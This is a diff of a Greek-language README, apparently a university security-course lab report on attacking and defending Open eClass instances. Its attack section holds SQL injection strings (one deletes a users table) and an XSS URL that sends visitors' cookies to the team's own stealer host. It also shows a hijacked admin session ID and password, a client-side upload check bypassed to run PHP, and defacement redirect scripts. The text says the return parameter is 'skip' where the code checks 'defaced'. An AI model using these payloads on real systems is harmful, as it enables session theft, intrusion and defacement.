@@ -107,16 +107,92 @@ $statement = mysqli_stmt_init($connection);
 
 Χρησιμοποιήσαμε το function **htmlspecialchars()** ώστε να αποτρέψουμε τον χρήστη από το να εισάγει
 ειδικούς χαρακτήρες και html tags όπως το script για να εισάγει κάποιο κακόβουλο script. Επιπλέον αλλάξαμε το PHP_SELF σε SCRIPT_NAME ώστε να μην εισάγεται κάποιο script μέσω του url της πλατφόρμας.
+
 ```php
 $title_temp = htmlspecialchars($row['title']);
 ```
 
 ### RFI
+
 Για να αποτρέψουμε τις επιθέσεις απο RFI χρησιμοποιήσαμε τις εξής τεχνικές:
+
 - Προσθέσαμε ένα randomly generated prefix στα filenames τα οποία γίνοντα upload/submit ώστε να μην μπορούν να προβλεφθούν.
+
 ```php
 $encoded_dropbox_filename = bin2hex(openssl_random_pseudo_bytes(32)) . $dropbox_filename;
 ```
+
 - Ως τελευταίο μέτρο αλλάξαμε τα permissions των αρχείων σε write only (0222) έτσι ώστε αν ο χρήστης εν τέλει καταφέρει να αποκτήσει πρόσβαση σε αυτά δεν θα μπορέσει να τα εκτελέσει.
-  
-<!-- ## Attacks -->
+
+## Attacks
+
+### SQL Injection
+
+Αρχικά προσπαθήσαμε να πειραματιστούμε με τα query params στα διάφορα module του μαθήματος. Είδαμε ότι στην περιοχή συζητήσεων του reply page (reply.php) όπου δίνεται το topic id μπορούμε να κάνουμε escape το sql string και να εκτελέσουμε το δικό μας select query.
+
+Έτσι επιλέξαμε τον κωδικό του admin από το user table και είδαμε ότι εμφανίζεται στο breadcrumb. Δυστυχώς όμως ο κωδικός αποθηκεύεται στην βάση αφότου γίνει MD5 hash και δοκιμάσαμε να τον κάνουμε decrypt χωρίς όμως κάποια επιτυχία.
+
+Προσπαθήσαμε να πειραματιστούμε με το login page εισάγοντας τα εξής credentials:
+> username: drunkadmin
+> 
+> password: ' OR 1=1;
+
+ώστε να κάνουμε escape τα quotes από το select query. Απ'ότι φαινόταν όμως τα queries είχαν προστατευθεί με htmlspecialchars και prepared statements εφόσον δεν καταφέραμε να δούμε τα αποτελέσματα του select.
+
+Δοκιμάσαμε επίσης να εκμεταλλευτούμε τα db queries που γίνονται στην υποβολή εργασιών και συγκεκριμένα στα σχόλια της εργασίας:
+```sql
+'); SELECT * FROM logins; --
+'); DELETE FROM users; --
+') OR 1=1; --
+```
+Σε όλες τις περιπτώσεις τα queries απέτυχαν επειδή η mysql_query δεν υποστηρίζει multiple statements οπότε το μόνο που εμφανιζόταν ήταν ότι υπήρχε syntax error στο query.
+
+
+
+### XSS
+Παρατηρήσαμε ότι υπάρχει ευπάθεια στην περιοχή συζητήσεων του μαθήματος στο σημείο όπου δίνεται το query parameter topic στο reply.php όπου μπορούμε να κάνουμε escape το sql query και να εκτελέσουμε ένα JS script. Αρχικά δοκιμάσαμε να κάνουμε alert() για να ελέγξουμε αν εκτελείται το script και εφόσον είδαμε ότι εμφανίζεται το alert δοκιμάσαμε να κάνουμε redirect.
+
+Συγκεκριμένα με το εξής URL:
+
+> http://sloppy-buffoons-2.csec.chatzi.org/modules/phpbb/reply.php?topic=2 AND 10=12) UNION SELECT <script>document.location=['http://kerberosclan.puppies.chatzi.org/cookie_stealer.php?cookie=%27,document.cookie].join(%27%27)</script> FROM eclass.user -- &forum=1
+
+κάναμε redirect στο cookie stealer site μας (προσθέτοντας το PHPSESSIONID στο url). Με αυτόν τον τρόπο μπορούμε να αποκτήσουμε το cookie οποιουδήποτε επισκέπτεται αυτό το URL. Επομένως στείλαμε ένα email στον admin παρατρέποντας τον να επισκεφτεί το site και έτσι αποκτήσαμε admin priviledges από το session id του:
+
+> PHPSESSID=2ggn0l7h3cgv3pdh47cvchh485
+
+
+Το επόμενο βήμα ήταν να κάνουμε login ως admin χρησιμοποιώντας το cookie που κλέψαμε και να μπούμε στο eclassconf.php για να δούμε τον κωδικό της βάσης (κάνοντας inspect εφόσον το html element είχε το password type). Ο κωδικός της βάσης είναι ο ίδιος με αυτόν του admin οπότε αλλάξαμε τον κωδικό για να έχουμε πρόσβαση και μετά την λήξη του session id:
+
+> Old password: CCV1Y8kJcj
+> 
+> New password: abcdefg
+
+### Deface
+
+Έχοντας admin priviledges κάναμε τις εξής ενέργειες:
+
+- Δοκιμάσαμε να χρησιμοποιήσουμε το "Ανέβασμα ιστοσελίδας" από την ενεργοποίηση εργαλείων όπου υπό κανονικές συνθήκες ο admin μπορεί να ανεβάσει μόνο html αρχεία. Εφόσον όμως ο έλεγχος για το file type γίνεται στον client απλά αφαιρέσαμε το allow attribute στο αντίστοιχο κουμπί και ανεβάσαμε ένα php file το οποίο εκτελείται από τον server. Η πρώτη μας σκέψη ήταν να δοκιμάσουμε να κάνουμε rename & unlink του contact.php έτσι ώστε να αντικαταστήσουμε την contact page με δικό μας περιεχόμενο. Δυστυχώς όλα τα αρχεία του apache δεν είχαν write permissions αλλά μόνο read+execute (755) και το chmod δεν επιτρεπόταν εφόσον δεν είχαμε το root password του vm. Επομένως αρκεστήκαμε στο να προσθέσουμε ένα extra site το οποίο έκανε redirect
+σε ένα δικό μας deface site από το puppies.
+
+- Μπήκαμε στο phpmyadmin από το admin panel έτσι ώστε να εκτελέσουμε queries στην βάση χωρίς τους περιορισμούς(htmlspecialchars,intval) που υπήρχαν όταν κάναμε form submits. Η πρώτη μας ενέργεια ήταν να αλλάξουμε το description του μαθήματος με το εξής script:
+
+	```html
+	<script>
+		document.location = 'https://bit.ly/3PcmMm8';
+	</script>
+	```
+
+	Κάθε φορά που ο χρήστης προσπαθεί να μπει στο μάθημα θα γίνεται αυτόματα redirect στο shortened link που δίνουμε οδηγώντας τον σε ένα defaced site του kerberosclan. Έτσι δεν θα έχει πλέον πρόσβαση στα εργαλεία του μαθήματος.
+
+- Η τελευταία μας ενέργεια ήταν να αντικαταστήσουμε εξολοκλήρου την αρχική σελίδα με τον ίδιο τρόπο. Έτσι προσθέσαμε (από το phpmyadmin) ένα script στο description ενός admin announcement
+το οποίο φορτώνεται στο index.php και κάναμε redirect σε ένα GIF page με ένα skip button για να μην αποκλειστούμε εντελώς από την πλατφόρμα.
+```html
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const param = urlParams.get("defaced");
+if(!param){
+document.location="http://kerberosclan.puppies.chatzi.org/skip.php"
+}
+</script>
+```
+Για να επιστρέψουμε στην πλατφόρμα ελέγχουμε αν υπάρχει το query param "skip" και αν ναι επιστρέφουμε τον χρήστη στο πραγματικό index.php page.
